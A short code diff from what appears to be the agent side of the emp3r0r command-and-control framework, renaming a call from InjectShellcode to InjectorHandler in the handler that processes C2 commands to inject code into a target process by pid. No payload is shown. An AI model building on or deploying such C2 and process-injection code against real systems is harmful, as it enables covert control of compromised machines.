@@ -414,7 +414,7 @@ func processCCData(data *emp3r0r_data.MsgTunData) {
 		if err != nil {
 			log.Print("Invalid pid")
 		}
-		err = InjectShellcode(pid, cmdSlice[1])
+		err = InjectorHandler(pid, cmdSlice[1])
 		if err != nil {
 			out = "failed: " + err.Error()
 		}
